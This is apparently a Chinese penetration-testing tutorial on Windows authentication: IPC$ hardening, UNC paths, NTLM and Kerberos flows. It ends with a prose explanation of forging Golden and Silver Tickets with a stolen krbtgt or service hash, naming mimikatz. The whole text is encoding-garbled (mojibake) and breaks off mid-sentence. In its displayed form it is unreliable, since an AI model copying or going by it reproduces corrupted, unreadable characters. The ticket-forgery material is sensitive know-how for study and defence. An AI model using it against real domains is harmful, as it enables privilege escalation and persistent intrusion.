ç­”ï¼šé¦–å…ˆè¦ç¦æ­¢ç©ºè¿æ¥è¿›è¡Œæšä¸¾(æ­¤æ“ä½œå¹¶ä¸èƒ½é˜»æ­¢ç©ºè¿æ¥çš„å»ºç«‹)ã€‚è¿è¡Œregeditï¼Œæ‰¾åˆ°ï¼š HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\LSAä¸‹çš„DWORDå€¼RestrictAnonymousçš„é”®å€¼æ”¹ä¸ºï¼š00000001ã€‚ ## é™¤äº†ä¸Šé¢çš„æ–¹æ³•ï¼Œä½ ä¹Ÿå¯ä»¥é€šè¿‡å±è”½139ï¼Œ445ç«¯å£æ¥é˜²èŒƒåˆ«äººé€šè¿‡IPC$æ¥å…¥ä¾µï¼Œå› ä¸ºæ²¡æœ‰139ï¼Œ445ç«¯å£çš„æ”¯æŒæ˜¯æ— æ³•å»ºç«‹IPC$çš„ï¼Œå› æ­¤å±è”½139ï¼Œ445ç«¯å£åŒæ ·å¯ä»¥é˜»æ­¢IPC$å…¥ä¾µã€‚ 1-6 UNCè·¯å¾„è®¿é—®## UNCï¼ˆUniversal Naming Conventionï¼‰ï¼šé€šç”¨å‘½åè§„åˆ™ï¼Œä¹Ÿç§°é€šç”¨å‘½åè§„èŒƒã€é€šç”¨å‘½åçº¦å®šã€‚ ## UNCä¸ºç½‘ç»œï¼ˆä¸»è¦æŒ‡å±€åŸŸç½‘ï¼‰ä¸Šèµ„æºçš„å®Œæ•´Windowsåç§°ã€‚è¿™ç§æ–¹å¼ä¹Ÿæ˜¯åŸºäºSAMæ–‡ä»¶å…±äº«åè®®æ¥å®ç°æ•°æ®ä¼ è¾“çš„ã€‚ ## æ ¼å¼ï¼š\\servername\\sharenameï¼Œå…¶ä¸­servernameæ˜¯æœåŠ¡å™¨åã€‚sharenameæ˜¯å…±äº«èµ„æºçš„åç§°ã€‚ ## ç›®å½•æˆ–æ–‡ä»¶çš„UNCåç§°å¯ä»¥åŒ…æ‹¬å…±äº«åç§°ä¸‹çš„ç›®å½•è·¯å¾„ï¼Œæ ¼å¼ä¸ºï¼š\\servername\\sharename\\directory\\filenameã€‚ ## å…±äº«æ–‡ä»¶è¿‡ç¨‹ ## é¦–å…ˆåˆ›å»ºæ–‡ä»¶å¤¹ï¼Œå³é”®å…±äº«ï¼Œé«˜çº§å…±äº«ã€‚åœ¨ä»¥ä¸Šé€‰é¡¹å¯é€‰æ—¶ä¾æ¬¡æ‰§è¡Œã€‚ ## è®¿é—®è¯¥æ–‡ä»¶å¤¹ï¼Œåœ¨åŒç½‘ç»œä¸­ï¼Œè¾“å…¥\\ + å¯¹æ–¹çš„ipæˆ–+å¯¹æ–¹çš„ä¸»æœºåå³å¯è®¿é—®å¯¹æ–¹å…±äº«çš„æ–‡ä»¶å¤¹ ## å…±äº«æ–‡ä»¶çš„åŠŸèƒ½åŸºäº445å·ç«¯å£ï¼Œå¦‚æœåœ¨\\+ä¸»æœºåçš„å½¢å¼è®¿é—®ï¼Œè¿˜éœ€è¦Netbios-ns137 ã€138ä»¥åŠTCP139ç«¯å£ã€‚ ## å…³é—­139ç«¯å£çš„æ–¹æ³•ï¼šâ€œç½‘ç»œè¿æ¥å±æ€§TCPIPåè®®å±æ€§é«˜çº§WINSä¸­è®¾ç½®å¯ç”¨æˆ–è€…ç¦ç”¨NBTï¼ˆNetBIOSover TCPIPï¼‰ ## å…³é—­445ç«¯å£çš„æ–¹æ³•ï¼šé˜²ç«å¢™é˜»å¡445ç«¯å£æˆ–è€…ç¦ç”¨serveræœåŠ¡éƒ½å¯ä»¥ã€‚ é€šè¿‡ipåœ°å€è¿æ¥ å…¶å®ä¸Šé¢æ˜¯çœç•¥å†™æ³•ï¼Œå®ƒæ˜¯åŸºäºfileåè®®çš„ é€šè¿‡ä¸»æœºåè¿æ¥ 2-2 Windowsç™»å½•è®¤è¯æµç¨‹æ—©æœŸSMBåè®®åœ¨ç½‘ç»œä¸Šä¼ è¾“æ˜æ–‡å£ä»¤ã€‚åæ¥å‡ºç° LAN Manager ChallengeResponseéªŒè¯æœºåˆ¶ï¼Œç®€ç§°LMï¼Œå®ƒæ˜¯å¦‚æ­¤ç®€å•ä»¥è‡³å¾ˆå®¹æ˜“å°±è¢«ç ´è§£ã€‚å¾®è½¯æå‡ºäº†WindowsNTæŒ‘æˆ˜å“åº”éªŒè¯æœºåˆ¶ï¼Œç§°ä¹‹ä¸ºNTLMã€‚å·²ç»æœ‰äº†æ›´æ–°çš„NTLM v2ä»¥åŠKerberoséªŒè¯ä½“ç³»ï¼ŒNTLML V2æ¯”V1æ›´åŠ å®‰å…¨ä¸€äº›ã€‚NTLMæ˜¯windowsæ—©æœŸå®‰å…¨åè®®ï¼Œå› å‘åå…¼å®¹æ€§è€Œä¿ç•™ä¸‹æ¥ã€‚NTLMæ˜¯NTLAN Managerçš„ç¼©å†™ï¼Œå³NT LANç®¡ç†å™¨ã€‚ Windows NTç³»åˆ—åŒ…å«çš„ç³»ç»Ÿç‰ˆæœ¬ï¼šhttps://www.365jz.com/article/24850 åœ¨windows 2000ä¹‹åï¼ŒKerberosæ˜¯åŸŸç¯å¢ƒä¸‹çš„é¦–é€‰è®¤è¯æ–¹å¼ï¼Œä½†æ˜¯å¦‚æœKerberosæ²¡æœ‰å¼€å¯æˆ–è€…å› ä¸ºæŸç§åŸå› å¯¼è‡´åŠŸèƒ½å¤±æ•ˆï¼Œé‚£ä¹ˆè¿˜æ˜¯ä¼šä½¿ç”¨NTMLçš„æ–¹å¼æ¥è¿›è¡Œè®¤è¯ï¼Œåœ¨è¿™windows 2000ä¹‹å‰åŸŸç¯å¢ƒä¸‹çš„è®¤è¯éƒ½æ˜¯é€šè¿‡NTMLå®ç°çš„ã€‚ä½†æ˜¯å·¥ä½œç»„ç¯å¢ƒçš„è®¤è¯ç›®å‰è¿˜æ˜¯ä½¿ç”¨çš„NTMLè®¤è¯æ–¹å¼ã€‚ 2-1 æœ¬åœ°ç™»å½•è®¤è¯## Windowsçš„æœ¬åœ°è®¤è¯æµç¨‹å¤§è‡´å¯ä»¥æŠ½è±¡ä¸ºä»¥ä¸‹ä¸‰ä¸ªæ­¥éª¤ï¼› 1ã€ç”± winlogon.exeè¿›ç¨‹æ¥å—ç”¨æˆ·è¾“å…¥çš„å¯†ç  2ã€è°ƒç”¨lsass.exeè¿›ç¨‹å¯¹ç”¨æˆ·è¾“å…¥çš„å¯†ç è¿›è¡ŒåŠ å¯†ï¼Œå°†å…¶è½¬æ¢ä¸ºNTLM Hash 3ã€å°†æœ‰å¯†ç è½¬æ¢æˆçš„NTLM Hashä¸SAMæ–‡ä»¶ä¸­å­˜å‚¨çš„NTLM Hashè¿›è¡Œæ¯”è¾ƒï¼Œå¦‚ç›¸åŒï¼Œå°†GroupSidä¸UserSidå‘é€ç»™winlogon.exeå‡†å¤‡ç™»é™†ï¼Œå¦‚ä¸åŒåˆ™ç™»é™†å¤±è´¥ winlogon.exeå³ Windows Logon Processï¼Œæ˜¯Windows NTç”¨æˆ·ç™»é™†ç¨‹åºï¼Œç”¨äºç®¡ç†ç”¨æˆ·ç™»å½•å’Œé€€å‡ºã€‚ lsass.exeå³Local Security Authority Serviceï¼Œæ˜¯Windowsç³»ç»Ÿçš„å®‰å…¨æœºåˆ¶ã€‚å®ƒç”¨äºæœ¬åœ°å®‰å…¨å’Œç™»é™†ç­–ç•¥ã€‚ SAMï¼Œè¿™é‡Œè¯´çš„çš„SAMæ˜¯Security Account Managerï¼Œä¸æ˜¯ä¸Šé¢æåˆ°çš„SAMåè®®æ˜‚ï¼Œè¿™æ˜¯Windowså¯¹ç”¨æˆ·è´¦æˆ·çš„å®‰å…¨ç®¡ç†ä½¿ç”¨çš„å®‰å…¨è´¦å·ç®¡ç†å™¨ï¼ŒSAMæ–‡ä»¶å³è´¦å·å¯†ç æ•°æ®åº“æ–‡ä»¶ã€‚ SAMæ–‡ä»¶çš„é»˜è®¤å­˜å‚¨è·¯å¾„ä¸ºï¼š%SystemRoot%\\system32\\config\\samNTLM Hashæ˜¯Windowsæ‰€é‡‡ç”¨çš„ä¸€ç§åŠ å¯†ç®—æ³•ï¼Œå…¶æµç¨‹å¦‚ä¸‹ï¼› æ˜æ–‡è½¬æ¢ä¸º16è¿›åˆ¶ASCIIç  ä½¿ç”¨little-endian(å°ç«¯)åºå°†å…¶åœ¨è½¬æ¢ä¸ºUnicodeæ ¼å¼ å¯¹æ‰€è·å–çš„ Unicodeä¸²è¿›è¡Œæ ‡å‡†MD4å•å‘å“ˆå¸Œï¼Œæ— è®ºæ•°æ®æºæœ‰å¤šå°‘å­—èŠ‚ï¼ŒMD4å›ºå®šäº§ç”Ÿ128-bitçš„å“ˆå¸Œå€¼ ä¾‹å¦‚ è¿‡ç¨‹å›¾è§£ï¼š ç™»å½•æˆåŠŸä¹‹åï¼Œå°†ç”¨æˆ·çš„sidå’Œå±äºsidå‘é€ç»™winlogon.exeè¿›ç¨‹ï¼Œå¹¶ä¸”æŒ‰ç…§sidæ¥å¯åŠ¨ç›¸åº”çš„æœåŠ¡ã€è¿›ç¨‹ï¼Œè€Œä¸”åˆ’åˆ†å¥½ç›®å½•ã€æ–‡ä»¶çš„æ“ä½œæƒé™ç­‰å·¥ä½œã€‚ 2-2 ç½‘ç»œç™»å½•æµç¨‹ç½‘ç»œç™»å½•è®¤è¯æµç¨‹ä¸»è¦æ˜¯æŒ‡å·¥ä½œç»„æˆ–è€…åŸŸç¯å¢ƒä¹‹é—´çš„ä¸»æœºäº’ç›¸è®¿é—®å¯¹æ–¹çš„èµ„æºæ—¶éœ€è¦åšçš„èº«ä»½è®¤è¯è¿‡ç¨‹ï¼Œæ­£å¸¸æ˜¯é€šè¿‡SMAæœåŠ¡çš„445ç«¯å£ï¼Œç›®å‰åœ¨å·¥ä½œç»„ä¹‹é—´ä¸»è¦ä½¿ç”¨çš„NTMLéªŒè¯æœºåˆ¶ï¼Œåœ¨åŸŸç¯å¢ƒä¸­ç›®å‰ä¸»è¦æ˜¯KerberoséªŒè¯æœºåˆ¶ï¼Œå¦‚æœkerberosæœºåˆ¶å› ä¸ºæŸç§åŸå› æ²¡æœ‰å¼€å¯ï¼Œé‚£ä¹ˆåŸŸçš„è®¤è¯æœºåˆ¶è¿˜æ˜¯ä¼šé‡‡ç”¨NTMLéªŒè¯æœºåˆ¶ã€‚ **2-2-1 NTML è®¤è¯** NTMLæ˜¯ä¸€ç§åŸºäºæŒ‘æˆ˜(Chalenge)å’Œå“åº”(Response)çš„è®¤è¯æœºåˆ¶ã€‚å®ƒçš„è®¤è¯è¿‡ç¨‹å¤§è‡´æœ‰ä¸‹é¢ä¸‰æ­¥ï¼š åå•†ï¼šä¸»è¦ç”¨äºç¡®è®¤åŒæ–¹åè®®ç‰ˆæœ¬ã€‚ è´¨è¯¢ï¼šå°±æ˜¯æŒ‘æˆ˜ï¼ˆChalengeï¼‰å“åº”ï¼ˆResponseï¼‰è®¤è¯æœºåˆ¶èµ·ä½œç”¨çš„èŒƒç•´ã€‚ éªŒè¯ï¼šéªŒè¯ä¸»è¦æ˜¯åœ¨è´¨è¯¢å®Œæˆåï¼ŒéªŒè¯ç»“æœï¼Œæ˜¯è®¤è¯çš„æœ€åä¸€æ­¥ **1-1 å·¥ä½œç»„ç¯å¢ƒä¸‹çš„NTMLè®¤è¯æµç¨‹** NTLMæ˜¯ä¸€ç§ç½‘ç»œè®¤è¯åè®®ï¼Œå®ƒæ˜¯åŸºäºæŒ‘æˆ˜ï¼ˆChallengeï¼‰å“åº”ï¼ˆResponseï¼‰è®¤è¯æœºåˆ¶çš„ä¸€ç§è®¤è¯æ¨¡å¼ã€‚(è¿™ä¸ªåè®®åªæ”¯æŒWindows)ï¼Œç”±ä¸‰ç§æ¶ˆæ¯ç»„æˆï¼šé€šå¸¸ç§°ä¸ºtype 1(åå•†)ï¼Œç±»å‹type 2(è´¨è¯¢)å’Œtype3(èº«ä»½éªŒè¯)ã€‚ ç¬¬ä¸€æ­¥,é¦–å…ˆåœ¨clientè¾“å…¥username,passwordå’Œdomain,ç„¶åclientä¼šæŠŠpassword hashåçš„å€¼å…ˆç¼“å­˜åˆ°æœ¬åœ° ç¬¬äºŒæ­¥,ä¹‹å,clientæŠŠusernameçš„æ˜æ–‡å‘é€ç»™server(DC) ç¬¬ä¸‰æ­¥,DCä¼šç”Ÿæˆä¸€ä¸ª 16å­—èŠ‚çš„éšæœºæ•°,å³challenge(æŒ‘æˆ˜ç ),å†ä¼ å›ç»™client ç¬¬å››æ­¥,å½“clientæ”¶åˆ°challengeä»¥å,ä¼šå…ˆå¤åˆ¶ä¸€ä»½å‡ºæ¥,ç„¶åå’Œç¼“å­˜ä¸­çš„å¯†ç hashå†ä¸€åŒæ··åˆhashä¸€æ¬¡,æ··åˆåçš„å€¼ç§°ä¸ºresponse,ä¹‹åclientå†å°†challenge,responseåŠusernameä¸€å¹¶éƒ½ä¼ ç»™server ç¬¬äº”æ­¥,serverç«¯åœ¨æ”¶åˆ°clientä¼ è¿‡æ¥çš„è¿™ä¸‰ä¸ªå€¼ä»¥åä¼šæŠŠå®ƒä»¬éƒ½è½¬å‘ç»™DC ç¬¬å…­æ­¥,å½“DCæ¥åˆ°è¿‡æ¥çš„è¿™ä¸‰ä¸ªå€¼çš„ä»¥å,ä¼šæ ¹æ®usernameåˆ°åŸŸæ§çš„è´¦å·æ•°æ®åº“(ntds.dit)é‡Œé¢æ‰¾åˆ°è¯¥usernameå¯¹åº”çš„hash,ç„¶åæŠŠè¿™ä¸ªhashæ‹¿å‡ºæ¥å’Œä¼ è¿‡æ¥çš„challengeå€¼å†æ··åˆhash ç¬¬ä¸ƒæ­¥,å°†( 6)ä¸­æ··åˆåçš„hashå€¼è·Ÿä¼ æ¥çš„responseè¿›è¡Œæ¯”è¾ƒ,ç›¸åŒåˆ™è®¤è¯æˆåŠŸ,åä¹‹,åˆ™å¤±è´¥,å½“ç„¶,å¦‚æœæ˜¯æœ¬åœ°ç™»å½•,æ‰€æœ‰éªŒè¯è‚¯å®šä¹Ÿå…¨éƒ¨éƒ½ç›´æ¥åœ¨æœ¬åœ°è¿›è¡Œäº† **1-2 åŸŸç¯å¢ƒä¸‹çš„NTMLè®¤è¯æµç¨‹** NTMLç‰ˆæœ¬åŒºåˆ« NTLM v1ä¸NTLM v2æœ€æ˜¾è‘—çš„åŒºåˆ«å°±æ˜¯ Challenge ä¸åŠ å¯†ç®—æ³•ä¸åŒï¼Œå…±åŒç‚¹å°±æ˜¯åŠ å¯†çš„åŸæ–™éƒ½æ˜¯NTLM Hashã€‚ ## ä¸‹é¢ç»†è¯´ä¸€ä¸‹æœ‰ä»€ä¹ˆä¸åŒ: Challage:NTLM v1çš„Challengeæœ‰8ä½ï¼ŒNTLM v2çš„Challengeä¸º16ä½ã€‚ Net-NTLM Hash:NTLM v1çš„ä¸»è¦åŠ å¯†ç®—æ³•æ˜¯DESï¼ŒNTLM v2çš„ä¸»è¦åŠ å¯†ç®—æ³•æ˜¯HMAC-MD5ã€‚ **2-2-2 åŸŸç¯å¢ƒä¸‹çš„Kerberosè®¤è¯æµç¨‹****Kerberosä»‹ç»** kerberosæ˜¯ä¸€ç§ç½‘ç»œè®¤è¯åè®®ï¼Œé€šè¿‡å¯†é’¥ç³»ç»Ÿä¸ºå®¢æˆ·ç«¯ä»¥åŠæœåŠ¡å™¨ç«¯æä¾›è®¤è¯æœåŠ¡ï¼Œè¯¥è¿‡ç¨‹ä¸ä¾èµ–äºä¸»æœºæ“ä½œç³»ç»Ÿè®¤è¯ï¼Œä¸ä¾èµ–ä¸»æœºåœ°å€ä¿¡ä»»ï¼Œä¸è¦æ±‚ç½‘ç»œå†…æ‰€æœ‰ä¸»æœºç‰©ç†å®‰å…¨ï¼ˆå‡å®šè¯¥ç½‘ç»œä¸Šçš„æ‰€æœ‰æ•°æ®å¯ä»¥ä»»æ„è¿›è¡Œè¯»å–ï¼Œä¿®æ”¹ï¼‰ã€‚kerberosä½œä¸ºå¯ä¿¡ä»»çš„ç¬¬ä¸‰æ–¹æœåŠ¡ï¼Œæ˜¯é€šè¿‡ä¼ ç»Ÿå¯†ç æŠ€æœ¯ï¼Œè¿›è¡Œå®‰å…¨æœåŠ¡çš„ã€‚ **Kerberosè®¤è¯ä¸­çš„å…³é”®å­—** åŸŸæ§åˆ¶å™¨ï¼ˆDomain Controllerï¼ŒDCï¼‰ å¯†é’¥åˆ†å‘ä¸­å¿ƒï¼ˆKey Distribution Centerï¼ŒKDCï¼‰ å¸æˆ·æ•°æ®åº“ï¼ˆAccount Databaseï¼ŒADï¼‰ èº«ä»½éªŒè¯æœåŠ¡ï¼ˆAuthentication Serviceï¼ŒASï¼‰ å…¥åœºå·[è®¤è¯ç¥¨æ®]ï¼ˆTicket Granting Ticketï¼ŒTGTï¼‰ ç¥¨æ®å‘æ”¾æœåŠ¡ï¼ˆTicket Granting Serviceï¼ŒTGSï¼‰ ç¥¨æ®ï¼ˆTicketï¼‰ Master Key Long-term Key |é•¿æœŸå¯†é’¥ï¼ˆè¢« HashåŠ å¯†çš„ç”¨æˆ·å¯†é’¥ï¼‰ Session Key Short-term Key | çŸ­æœŸä¼šè¯å¯†é’¥ krbtgt è´¦æˆ· Account Databaseï¼šç±»ä¼¼äº SAMçš„æ•°æ®åº“ï¼Œå­˜å‚¨æ‰€æœ‰ Clientçš„ç™½åå•ï¼Œåªæœ‰å¤„äºç™½åå•ä¸­çš„ Clientæ‰å¯ä»¥æˆåŠŸç”³è¯· TGT Authentication Serviceï¼šä¸º Clientç”Ÿæˆ TGTçš„æœåŠ¡ Ticket Granting Ticketï¼šå…¥åœºåˆ¸ï¼Œé€šè¿‡å…¥åœºåˆ¸èƒ½å¤Ÿè·å¾—ç¥¨æ®ï¼Œæ˜¯ä¸€ç§ä¸´æ—¶å‡­è¯çš„å­˜åœ¨ Ticket Granting Serviceï¼šä¸º Clientç”ŸæˆæŸä¸ªæœåŠ¡çš„ç¥¨æ® Ticketï¼šç¥¨æ®ï¼Œç½‘ç»œå¯¹è±¡äº’ç›¸è®¿é—®çš„å‡­è¯ Master Keyï¼šé•¿æœŸå¯†é’¥ã€‚å°†æœ¬æœºå¯†ç è¿›è¡Œ Hashè¿ç®—ï¼ˆNTMLï¼‰å¾—åˆ°ä¸€ä¸ªHash Code, æˆ‘ä»¬ä¸€èˆ¬ç®¡è¿™æ ·çš„ Hash Codeå«åš Master Key Session Keyï¼šçŸ­æœŸä¼šè¯å¯†é’¥ã€‚ä¸€ç§åªåœ¨ä¸€æ®µæ—¶é—´å†…æœ‰æ•ˆçš„ Key krbtgtè´¦æˆ·ï¼šæ¯ä¸ªåŸŸæ§åˆ¶å™¨éƒ½æœ‰ä¸€ä¸ª krbtgtçš„ç”¨æˆ·è´¦æˆ·ï¼Œæ˜¯ KDCçš„æœåŠ¡è´¦æˆ·ï¼Œç”¨æ¥åˆ›å»ºç¥¨æ®æˆäºˆæœåŠ¡ (TGS)åŠ å¯†çš„å¯†é’¥ Kerberosè®¤è¯çš„ä¸‰åªç‹—å¤´æŒ‡çš„æ˜¯å¦‚ä¸‹ä¸‰ä¸ªè§’è‰²ï¼š Client Server DCï¼ˆKDCï¼‰ã€‚åœ¨ WindowsåŸŸç¯å¢ƒä¸­ï¼ŒKDCçš„è§’è‰²ç”± DCï¼ˆDomain Controllerï¼‰æ¥æ‹…å½“ 1)é¦–å…ˆ,å®¢æˆ·ç«¯(client)å°†åŸŸç”¨æˆ·çš„å¯†ç hashä¸€æ¬¡å¹¶ä¿å­˜,ç„¶å,ä»¥æ­¤hashæ¥ä½œä¸ºå®¢æˆ·ç«¯å’ŒKDCä¹‹é—´çš„é•¿æœŸå…±äº«å¯†é’¥kc 2)ä¹‹å,å®¢æˆ·ç«¯(client)å¼€å§‹åˆ©ç”¨( 1)ä¸­çš„åŸŸç”¨æˆ·å¯†ç hashå†æŠŠæ—¶é—´æˆ³,clientid,TGS idç­‰ä¿¡æ¯æ··åˆhashä¸€æ¬¡,ç„¶åå‘as(è®¤è¯æœåŠ¡å™¨ [Authentication Server])æœåŠ¡å™¨è¿›è¡Œè¯·æ±‚ 3)asæ¥åˆ°è¯¥è¯·æ±‚å,åˆ©ç”¨é•¿æœŸå…±äº«å¯†é’¥(kc)è¿›è¡Œè§£å¯†,è§£å¯†æˆåŠŸå,ä¼šè¿”å›ç»™å®¢æˆ·ç«¯ä¸¤ä¸ªç¥¨æ® (1)åŠ å¯†çš„K(c,tgs)(ç”¨äºå®¢æˆ·ç«¯åç»­å‘KDCå‘èµ·è¯·æ±‚),TGS NameID,æ—¶é—´æˆ³ç­‰,è¯¥ç¥¨æ®ç”±KcåŠ å¯† (2)ç¥¨æ®æˆäºˆç¥¨æ®(Ticket Granting Ticket,ç®€ç§°TGT),è¯¥ç¥¨æ®æ˜¯ç»™TGSçš„,ç¥¨æ®çš„å†…å®¹åŒ…æ‹¬K(c,tgs),Clientèº«ä»½ä¿¡æ¯,åŸŸå,æ—¶é—´æˆ³ç­‰,è¯¥ç¥¨æ®ç”±TGSçš„ç§˜é’¥åŠ å¯†,åªæœ‰TGSèƒ½å¤Ÿè§£å¯† 4)ç„¶å,å®¢æˆ·ç«¯ä¼šåˆ©ç”¨é•¿æœŸå…±äº«å¯†é’¥è§£å¯†k(c,tgs),å¹¶åˆ©ç”¨è¯¥ç§˜é’¥åŠ å¯†ç”Ÿæˆä¸€ä¸ªAuthenticator,å†…å®¹åŒ…æ‹¬:lifetime,æ—¶é—´æˆ³,Clientèº«ä»½ä¿¡æ¯ç­‰,è¿åŒä»ASè·å–çš„TGTä¸€å¹¶å‘é€ç»™TGS 5)TGSåˆ©ç”¨è‡ªèº«çš„ç§˜é’¥è§£å¯†TGT,è·å–K(c,tgs),å¹¶ç”¨K(c,tgs)è§£å¯†å®¢æˆ·ç«¯å‘é€çš„Authenticator,å¯¹Clientè¿›è¡Œè®¤è¯,å¦‚æœClienté€šè¿‡äº†è®¤è¯,TGSéšæœºç”Ÿæˆä¸€ä¸ªSession Key K(c,s),å¹¶äº§ç”Ÿä¸¤ä¸ªç¥¨æ® (1)æœåŠ¡ç¥¨æ®(Ts) :è¿™æ˜¯ç»™æœåŠ¡å™¨çš„æœåŠ¡ç¥¨æ®,ç”±Serverç§˜é’¥KsåŠ å¯†,å†…å®¹åŒ…æ‹¬ï¼šK(c,s),Clientèº«ä»½ä¿¡æ¯,Service ID,æ—¶é—´æˆ³,lifetimeç­‰ (2)å®¢æˆ·ç«¯ç¥¨æ®(Tc)ï¼šè¯¥ç¥¨æ®ç”±K(c,tgs)åŠ å¯†,å†…å®¹åŒ…æ‹¬ï¼šK(c,s),Serverèº«ä»½ä¿¡æ¯ç­‰ 6)å®¢æˆ·ç«¯æ”¶åˆ°tgsçš„å›åº”å,åˆ©ç”¨K(c,tgs)è§£å¯†Tc,è·å–K(c,s),Serverèº«ä»½ä¿¡æ¯ç­‰,å¹¶åˆ©ç”¨K(c,s)åŠ å¯†ç”Ÿæˆä¸€ä¸ªAuthenticatorå‘é€ç»™Server,å†…å®¹åŒ…æ‹¬ :æ—¶é—´æˆ³,Client IDç­‰ä¿¡æ¯,è¿åŒTsä¸€å¹¶å‘é€ç»™Server 7)Serverç«¯åœ¨æ”¶åˆ°Clientçš„è¯·æ±‚å,åˆ©ç”¨è‡ªèº«ç§˜é’¥Ksè§£å¯†Ts,å¾—åˆ°K(c,s),å†åˆ©ç”¨K(c,s)è§£å¯†Authenticator,å¯¹Clientè¿›è¡Œè®¤è¯,å¦‚æœè®¤è¯é€šè¿‡,åˆ™è¡¨ç¤ºKDCå·²ç»å…è®¸äº†æ­¤æ¬¡é€šä¿¡,æ­¤æ—¶Severæ— éœ€ä¸KDCé€šä¿¡,å› ä¸ºKsä¸ºKDCå’ŒSeverä¹‹é—´çš„é•¿æœŸå…±äº«ç§˜é’¥,å¦‚æœåœ¨æœ‰æ•ˆæ—¶é—´å†…,åˆ™æ­¤æ¬¡è¯·æ±‚æœ‰æ•ˆ å…³äºkerberosåˆ©ç”¨æ–¹æ³•: 1) é»„é‡‘ç¥¨æ®(Golden Ticket) ## å…ˆå‡è®¾è¿™ä¹ˆä¸€ç§æƒ…å†µ,åŸå…ˆå·²æ‹¿åˆ°çš„åŸŸå†…æ‰€æœ‰çš„è´¦æˆ·hash,åŒ…æ‹¬krbtgtè¿™ä¸ªè´¦æˆ·,ç”±äºæœ‰äº›åŸå› å¯¼è‡´åŸŸç®¡æƒé™ä¸¢å¤±,ä½†å¥½åœ¨ä½ è¿˜æœ‰ä¸€ä¸ªæ™®é€šåŸŸç”¨æˆ·æƒé™,ç¢°å·§ç®¡ç†å‘˜åœ¨åŸŸå†…åŠ å›ºæ—¶å¿˜è®°é‡ç½®krbtgtå¯†ç ,åŸºäºæ­¤æ¡ä»¶,æˆ‘ä»¬è¿˜èƒ½åˆ©ç”¨è¯¥ç¥¨æ®é‡æ–°è·å¾—åŸŸç®¡ç†å‘˜æƒé™,åˆ©ç”¨krbtgtçš„HASHå€¼å¯ä»¥ä¼ªé€ ç”Ÿæˆä»»æ„çš„TGT(mimikatz),èƒ½å¤Ÿç»•è¿‡å¯¹ä»»æ„ç”¨æˆ·çš„è´¦å·ç­–ç•¥,è®©ç”¨æˆ·æˆä¸ºä»»æ„ç»„çš„æˆå‘˜,å¯ç”¨äºKerberosè®¤è¯çš„ä»»ä½•æœåŠ¡ 2) ç™½é“¶ç¥¨æ®(Silver Ticket) ## é€šè¿‡è§‚å¯ŸKerberosåè®®çš„è®¤è¯è¿‡ç¨‹ä¸éš¾å‘ç°,å¦‚æœæˆ‘ä»¬è·å–äº†Serverç§˜é’¥Ks(æœåŠ¡å™¨å£ä»¤æ•£åˆ—å€¼),å°±å¯ä»¥è·³è¿‡KDCçš„è®¤è¯ï¼Œç›´æ¥ä¼ªé€ ç¥¨æ®å’Œç›®æ ‡Serveré€šä¿¡å…³äºé»„é‡‘ç¥¨æ®å’Œç™½é“¶ç¥¨æ®çš„ä¸€äº›åŒºåˆ«: 1)è®¿é—®æƒé™ä¸åŒ Golden Ticket: ä¼ªé€ TGT,å¯ä»¥è·å–ä»»ä½•KerberosæœåŠ¡æƒé™ Silver Ticket: ä¼ªé€ TGS,åªèƒ½è®¿é—®æŒ‡å®šçš„æœåŠ¡ 2)åŠ å¯†æ–¹å¼ä¸åŒ Golden Ticket ç”±Kerberosçš„HashåŠ å¯† Silver Ticket ç”±æœåŠ¡è´¦å·(é€šå¸¸ä¸ºè®¡ç®—æœºè´¦æˆ·)HashåŠ å¯† 3)è®¤è¯æµç¨‹ä¸åŒ Golden Ticket çš„åˆ©ç”¨è¿‡ç¨‹éœ€è¦è®¿é—®åŸŸæ§,è€ŒSilver Ticketä¸éœ€è¦ ## å°ç»“: ## è¿™äº›å…¶å®éƒ½æ˜¯åŸŸå†…æ¸—é€æœ€åŸºç¡€çš„çŸ¥è¯†,æ‰€ä»¥è§‰å¾—å¤§å®¶è¿˜æ˜¯éå¸¸æœ‰å¿…è¦å¤šèŠ±ç‚¹å„¿æ—¶é—´,å¥½å¥½æ·±åˆ»ä½“ä¼šä¸€ä¸‹,å¦å¤–,å¾®è½¯ç»™æˆ‘ä»¬çš„å»ºè®®æ˜¯,å°½é‡ä»¬ä¸è¦ç›´æ¥ä½¿ç”¨NTLM,è€Œä½¿ç”¨negotiate,å¦‚æœä½¿ç”¨çš„æ˜¯negotiate,windowsåˆ™ä¼šå…ˆåˆ¤æ–­kerberosæ˜¯å¦å¯ç”¨,å¦‚æœå¯ç”¨å°±ä¼˜å…ˆä½¿ç”¨kerberos,å¦åˆ™æ‰ä¼šä½¿ç”¨NTLM,kerberosçš„å®‰å…¨æ€§ç¡®å®è¦æ¯”NTLMè¦é«˜å¾ˆå¤š **Kerberosä»‹ç»è®¤è¯ä¸­æ¶‰åŠåˆ°çš„è§’è‰²** ASï¼ˆAuthentication Serverï¼‰ è®¤è¯æœåŠ¡å™¨ KDCï¼ˆKey Distribution Centerï¼‰ å¯†é’¥åˆ†å‘ä¸­å¿ƒ TGTï¼ˆTicket Granting Ticketï¼‰ ç¥¨æ®æˆæƒç¥¨æ®ï¼Œç¥¨æ®çš„ç¥¨æ® TGSï¼ˆTicket Granting Serverï¼‰ ç¥¨æ®æˆæƒæœåŠ¡å™¨ SSï¼ˆService Serverï¼‰ ç‰¹å®šæœåŠ¡æä¾›ç«¯ ç®€å•æ¥è¯´ ## å®¢æˆ·ç«¯ç”¨æˆ·å‘é€è‡ªå·±çš„ç”¨æˆ·ååˆ°KDCæœåŠ¡å™¨ä»¥å‘ASæœåŠ¡è¿›è¡Œè®¤è¯ã€‚KDCæœåŠ¡å™¨ä¼šç”Ÿæˆç›¸åº”çš„TGTç¥¨æ®ï¼Œæ‰“ä¸Šæ—¶é—´æˆ³ï¼Œåœ¨æœ¬åœ°æ•°æ®åº“ä¸­æŸ¥æ‰¾è¯¥ç”¨æˆ·çš„å¯†ç ï¼Œå¹¶ç”¨è¯¥å¯†ç å¯¹TGTè¿›è¡ŒåŠ å¯†ï¼Œå°†ç»“æœå‘è¿˜ç»™å®¢æˆ·ç«¯ç”¨æˆ·ã€‚è¯¥æ“ä½œä»…åœ¨ç”¨æˆ·ç™»å½•æˆ–è€…kinitç”³è¯·çš„æ—¶å€™è¿›è¡Œã€‚ å®¢æˆ·ç«¯æ”¶åˆ°è¯¥ä¿¡æ¯ï¼Œå¹¶ä½¿ç”¨è‡ªå·±çš„å¯†ç 